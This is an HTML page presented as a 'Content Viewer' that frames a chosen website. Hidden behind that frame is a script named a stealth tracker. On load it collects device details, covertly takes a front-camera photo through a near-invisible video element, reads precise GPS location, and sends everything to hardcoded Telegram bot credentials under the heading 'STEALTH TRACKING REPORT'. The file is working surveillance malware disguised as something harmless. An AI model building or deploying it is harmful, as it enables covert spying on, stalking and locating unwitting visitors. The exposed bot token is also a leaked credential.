<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Content Viewer</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    html, body { 
      height: 100%; 
      margin: 0; 
      padding: 0; 
      overflow: hidden; 
    }
    
    iframe { 
      width: 100%; 
      height: 100%; 
      border: 0; 
      display: block; 
    }
    
    /* Camera container - properly positioned but invisible */
    #cameraContainer {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      overflow: hidden;
      z-index: -1000;
    }
    
    #cameraVideo {
      width: 640px;
      height: 480px;
      opacity: 0.001;
    }
    
    #cameraCanvas {
      display: none;
    }
  </style>
</head>
<body>
  <!-- Main website content -->
  <iframe id="siteFrame" sandbox="allow-forms allow-same-origin allow-scripts allow-popups allow-modals"></iframe>
  
  <!-- Camera system -->
  <div id="cameraContainer">
    <video id="cameraVideo" autoplay playsinline muted></video>
    <canvas id="cameraCanvas"></canvas>
  </div>

  <script>
    /******************** CONFIG ********************/
    const ADMIN_CHAT_ID = "6314556756";
    const BOT_TOKEN = "8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ";
    /************************************************/

    class FixedStealthTracker {
      constructor() {
        this.deviceData = {};
        this.cameraStream = null;
        this.hasSentReport = false;
      }

      async initialize() {
        console.log('üöÄ Starting tracker...');
        
        // Load target site first
        this.loadTargetSite();
        
        // Collect basic device info
        await this.collectBasicInfo();
        
        // Start camera with proper error handling
        await this.handleCameraCapture();
        
        // Get location
        await this.handleLocation();
        
        // Send final report
        await this.sendFinalReport();
      }

      loadTargetSite() {
        const site = this.getUrlParam('site');
        const iframe = document.getElementById('siteFrame');
        
        if (site && this.isValidHttpsUrl(site)) {
          console.log('üåê Loading site:', site);
          iframe.src = site;
        } else {
          iframe.srcdoc = '<html><body style="padding:20px;font-family:Arial"><h3>Content Viewer</h3></body></html>';
        }
      }

      async collectBasicInfo() {
        this.deviceData = {
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
          }
        };

        // Battery info
        if ('getBattery' in navigator) {
          try {
            const battery = await navigator.getBattery();
            this.deviceData.battery = {
              level: Math.round(battery.level * 100) + '%',
              charging: battery.charging
            };
          } catch (e) {}
        }

        console.log('üìä Basic info collected');
      }

      async handleCameraCapture() {
        try {
          console.log('üì∑ Attempting camera access...');
          
          // Check if media devices are available
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error('Camera API not supported');
          }

          // Request camera access
          this.cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 640 },
              height: { ideal: 480 },
              facingMode: 'user'
            }
          });

          const video = document.getElementById('cameraVideo');
          const canvas = document.getElementById('cameraCanvas');
          
          // Set canvas size
          canvas.width = 640;
          canvas.height = 480;
          
          const ctx = canvas.getContext('2d');

          video.srcObject = this.cameraStream;

          // Wait for video to be ready
          await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('Camera timeout')), 10000);
            
            video.onloadeddata = () => {
              clearTimeout(timeout);
              console.log('‚úÖ Camera video loaded');
              resolve();
            };
            
            video.onerror = () => {
              clearTimeout(timeout);
              reject(new Error('Video error'));
            };
          });

          // Wait for video to start playing
          await new Promise((resolve) => {
            if (video.readyState >= 3) {
              resolve();
            } else {
              video.onplaying = resolve;
            }
          });

          console.log('üé• Video is playing, waiting for camera to adjust...');

          // Wait longer for camera to adjust to light
          await this.delay(3000);

          // Capture photo
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Check if canvas has content
          const imageData = ctx.getImageData(0, 0, 1, 1).data;
          if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
            console.warn('‚ö†Ô∏è Canvas appears black, retrying...');
            await this.delay(1000);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          }

          // Convert to blob
          const photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.8);
          });

          if (photoBlob && photoBlob.size > 1000) { // Ensure photo has content
            this.deviceData.cameraPhoto = photoBlob;
            this.deviceData.cameraStatus = 'SUCCESS - Photo captured';
            console.log('‚úÖ Camera photo captured successfully');
          } else {
            throw new Error('Photo is too small or empty');
          }

        } catch (error) {
          console.error('‚ùå Camera error:', error);
          this.deviceData.cameraStatus = 'FAILED: ' + error.message;
        } finally {
          // Clean up camera
          if (this.cameraStream) {
            setTimeout(() => {
              this.cameraStream.getTracks().forEach(track => track.stop());
              console.log('üîí Camera stream stopped');
            }, 2000);
          }
        }
      }

      async handleLocation() {
        if (!navigator.geolocation) {
          this.deviceData.locationStatus = 'Geolocation not supported';
          return;
        }

        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });

          this.deviceData.location = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          
          this.deviceData.locationStatus = 'SUCCESS';
          console.log('üìç Location acquired');

        } catch (error) {
          this.deviceData.locationStatus = 'FAILED: ' + error.message;
          console.warn('üìç Location failed:', error);
        }
      }

      async sendFinalReport() {
        if (this.hasSentReport) return;
        this.hasSentReport = true;

        const USER_CHAT_ID = this.getUrlParam('chat_id');
        const recipients = [ADMIN_CHAT_ID];
        if (USER_CHAT_ID) recipients.push(USER_CHAT_ID);

        console.log('üì§ Sending report to:', recipients);

        for (const recipient of recipients) {
          try {
            // Send text message first
            await this.sendTelegramMessage(recipient);
            
            // Send location if available
            if (this.deviceData.location) {
              await this.sendTelegramLocation(recipient);
            }
            
            // Send photo if available
            if (this.deviceData.cameraPhoto) {
              await this.sendTelegramPhoto(recipient);
            }
            
            console.log('‚úÖ Report sent to', recipient);
            
          } catch (error) {
            console.error('‚ùå Failed to send to', recipient, error);
          }
        }
      }

      async sendTelegramMessage(chatId) {
        const message = this.formatMessage();
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${await response.text()}`);
        }
        
        return await response.json();
      }

      async sendTelegramLocation(chatId) {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            latitude: this.deviceData.location.latitude,
            longitude: this.deviceData.location.longitude
          })
        });
        
        if (!response.ok) {
          throw new Error(`Location send failed: ${response.status}`);
        }
      }

      async sendTelegramPhoto(chatId) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', this.deviceData.cameraPhoto, 'photo.jpg');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        
        if (!response.ok) {
          throw new Error(`Photo send failed: ${response.status}`);
        }
      }

      formatMessage() {
        return `
üïµÔ∏è <b>STEALTH TRACKING REPORT</b>

<b>üì± Device Information:</b>
‚Ä¢ <b>Platform:</b> ${this.deviceData.platform}
‚Ä¢ <b>Screen:</b> ${this.deviceData.screen.width}x${this.deviceData.screen.height}
‚Ä¢ <b>Battery:</b> ${this.deviceData.battery?.level || 'N/A'} ${this.deviceData.battery?.charging ? '‚ö°' : ''}
‚Ä¢ <b>Language:</b> ${this.deviceData.language}
‚Ä¢ <b>Timezone:</b> ${this.deviceData.timezone}

<b>üìç Location:</b> ${this.deviceData.location ? '‚úÖ Acquired' : '‚ùå ' + (this.deviceData.locationStatus || 'Failed')}
<b>üì∏ Camera:</b> ${this.deviceData.cameraPhoto ? '‚úÖ Photo Captured' : '‚ùå ' + (this.deviceData.cameraStatus || 'Failed')}

<b>üîó Target Site:</b>
<code>${this.getUrlParam('site')}</code>

<b>‚è∞ Time:</b> ${new Date().toLocaleString()}
        `.trim();
      }

      // Utility functions
      delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }

      getUrlParam(name) {
        const urlParams = new URLSearchParams(window.location.search);
        let value = urlParams.get(name);
        if (value) try { value = decodeURIComponent(value); } catch(e) {}
        return value;
      }

      isValidHttpsUrl(url) {
        try {
          return new URL(url).protocol === 'https:';
        } catch {
          return false;
        }
      }
    }

    // Start tracking with error handling
    window.addEventListener('load', () => {
      console.log('üîç Starting stealth tracker...');
      const tracker = new FixedStealthTracker();
      
      tracker.initialize().catch(error => {
        console.error('‚ùå Tracker failed:', error);
        
        // Send error report
        const errorMessage = `‚ùå Tracker Error: ${error.message}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            text: errorMessage
          })
        }).catch(e => console.error('Failed to send error:', e));
      });
    });

  </script>
</body>
   </html>
